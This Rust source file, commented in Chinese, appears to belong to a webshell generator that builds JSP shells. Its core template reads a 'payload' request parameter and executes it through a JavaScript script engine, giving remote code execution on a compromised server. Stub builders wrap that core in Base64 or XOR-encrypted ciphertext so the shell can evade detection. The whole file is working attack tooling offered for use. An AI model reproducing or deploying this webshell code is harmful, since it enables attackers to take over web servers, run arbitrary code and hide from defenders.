/// 获取 JSP 文件型 Shell 基础模板
/// 占位符 `%s` 是解密存根代码
pub fn get_template() -> String {
    "<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\" %>\n<%\n%s\n%>".to_string()
}

/// 获取 JSP 核心执行代码（将被加密）
pub fn get_core() -> String {
    r#"
String pass = request.getParameter("pass");
if (pass != null) {
    String payload = request.getParameter("payload");
    if (payload != null) {
        javax.script.ScriptEngine engine = new javax.script.ScriptEngineManager().getEngineByName("JavaScript");
        engine.eval(payload);
    }
}
"#.to_string()
}

use crate::core::crypto::EncryptionType;

/// 构建 JSP 解密存根
pub fn build_decrypt_stub(
    encryption: &EncryptionType,
    ciphertext: &str,
    _nonce: &Option<String>,
    _tag: &Option<String>,
    password: &str,
) -> String {
    match encryption {
        EncryptionType::None => {
            format!(
                "String ciphertext = \"{}\";\nbyte[] decoded = java.util.Base64.getDecoder().decode(ciphertext);\nString payload = new String(decoded);\njavax.script.ScriptEngine engine = new javax.script.ScriptEngineManager().getEngineByName(\"JavaScript\");\nengine.eval(payload);\n",
                ciphertext
            )
        }
        EncryptionType::XOR => {
            format!(
                "String ciphertext = \"{}\";\nbyte[] decoded = java.util.Base64.getDecoder().decode(ciphertext);\njava.security.MessageDigest md = java.security.MessageDigest.getInstance(\"SHA-256\");\nbyte[] key = md.digest(\"{}\".getBytes());\nbyte[] result = new byte[decoded.length];\nfor (int i = 0; i < decoded.length; i++) {{\n    result[i] = (byte)(decoded[i] ^ key[i % key.length]);\n}}\nString payload = new String(result);\njavax.script.ScriptEngine engine = new javax.script.ScriptEngineManager().getEngineByName(\"JavaScript\");\nengine.eval(payload);\n",
                ciphertext, password
            )
        }
        EncryptionType::AES256GCM => "// AES-256-GCM not implemented for JSP yet".to_string(),
        EncryptionType::ChaCha20Poly1305 => "// ChaCha20-Poly1305 not implemented for JSP yet".to_string(),
    }
}
